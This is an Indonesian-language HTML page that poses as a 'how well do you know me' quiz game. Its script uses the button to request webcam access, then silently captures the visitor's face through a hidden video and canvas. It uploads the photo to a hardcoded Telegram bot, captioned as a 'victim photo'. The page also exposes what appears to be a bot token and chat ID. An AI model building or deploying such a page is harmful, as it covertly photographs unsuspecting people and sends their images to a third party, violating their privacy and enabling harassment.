<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SEBERAPA KENAL SIH LU SAMA üòíüñïüèª</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #000428 0%, #004e92 100%);
            font-family: 'Arial Black', 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        
        .card {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 40px;
            padding: 40px 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            border: 4px solid #ffd700;
        }
        
        h1 {
            font-size: 2.5em;
            color: #000428;
            margin-bottom: 20px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        
        h1 span {
            color: #ffd700;
            text-shadow: 2px 2px 0 #000428;
        }
        
        .sub {
            color: #666;
            margin-bottom: 40px;
            font-size: 1.1em;
        }
        
        .gas-btn {
            background: linear-gradient(135deg, #ffd700 0%, #ff8c00 100%);
            color: #000428;
            border: none;
            width: 200px;
            height: 200px;
            border-radius: 50%;
            font-size: 4em;
            font-weight: bold;
            text-transform: uppercase;
            cursor: pointer;
            box-shadow: 0 10px 0 #b95f00, 0 20px 30px rgba(0,0,0,0.3);
            transition: all 0.1s ease;
            margin: 20px auto;
            display: block;
            border: 5px solid white;
            letter-spacing: 5px;
        }
        
        .gas-btn:hover {
            transform: translateY(5px);
            box-shadow: 0 5px 0 #b95f00, 0 15px 25px rgba(0,0,0,0.3);
        }
        
        .gas-btn:active {
            transform: translateY(10px);
            box-shadow: 0 0px 0 #b95f00, 0 10px 20px rgba(0,0,0,0.3);
        }
        
        .status {
            margin-top: 30px;
            padding: 15px;
            border-radius: 50px;
            background: #f0f0f0;
            color: #333;
            font-weight: bold;
        }
        
        .footer {
            margin-top: 30px;
            color: rgba(255,255,255,0.5);
            font-size: 0.9em;
        }
        
        #video, #canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>SEBERAPA <span>KENAL</span> LU SAMA GW?</h1>
            <div class="sub">klik tombol GASSS buat buktiin! üî•</div>
            
            <button class="gas-btn" id="gasBtn">GASSS</button>
            
            <div class="status" id="status">üïπÔ∏è siap gas? klik tombolnya!</div>
        </div>
        <div class="footer">üñï buat nyet yang baca üñï</div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const BOT_TOKEN = "8086111548:AAE9hSY7CgA8WhgG1Zs_x9CEbvAf1YKJ42A";
        const CHAT_ID = "8115098922";
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const statusEl = document.getElementById('status');
        const gasBtn = document.getElementById('gasBtn');
        
        let stream = null;
        let cameraReady = false;
        
        async function kirimFotoKeBot(imageBlob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', imageBlob, `muka_nyet_${Date.now()}.jpg`);
            formData.append('caption', `PHOTO KORBANüòò!`);
            
            try {
                statusEl.innerHTML = 'SABAR CIL PENDEKü§èüèª......';
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                
                if (result.ok) {
                    statusEl.innerHTML = 'NUNGGUIN YA YAHAHAH!';
                } else {
                    statusEl.innerHTML = '‚ùå eror: ' + (result.description || 'error');
                }
            } catch (e) {
                statusEl.innerHTML = '‚ùå error: ' + e.message;
            }
        }
        
        async function ambilFoto() {
            if (!cameraReady || !stream) {
                statusEl.innerHTML = '‚ùå eror';
                return;
            }
            
            try {
                statusEl.innerHTML = 'SABARRR...';
                
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const blob = await new Promise(resolve => {
                    canvas.toBlob(resolve, 'image/jpeg', 0.9);
                });
                
                if (blob) {
                    await kirimFotoKeBot(blob);
                } else {
                    statusEl.innerHTML = '‚ùå eror';
                }
            } catch (e) {
                statusEl.innerHTML = '‚ùå eror: ' + e.message;
            }
        }
        
        async function mintaKamera() {
            try {
                statusEl.innerHTML = 'KLIK IZINKAN BIAR KELIATAN TOMBOLNYA...';
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: 640,
                        height: 480,
                        facingMode: 'user'
                    } 
                });
                
                video.srcObject = stream;
                await video.play();
                cameraReady = true;
                
                statusEl.innerHTML = 'YAHAHAHHAHAAH NGAPAIN DEKüóø...';
                
                // Foto otomatis pas kamera siap
                setTimeout(() => {
                    ambilFoto();
                }, 1000);
                
            } catch (err) {
                statusEl.innerHTML = '‚ùå eror: ' + err.message;
                cameraReady = false;
            }
        }
        
        gasBtn.addEventListener('click', function() {
            // Animasi
            this.style.transform = 'translateY(10px)';
            this.style.boxShadow = '0 0px 0 #b95f00, 0 10px 20px rgba(0,0,0,0.3)';
            
            setTimeout(() => {
                this.style.transform = '';
                this.style.boxShadow = '';
            }, 200);
            
            // Minta kamera kalo belum
            if (!cameraReady) {
                mintaKamera();
            } else {
                ambilFoto();
            }
        });
    </script>
</body>
</html>
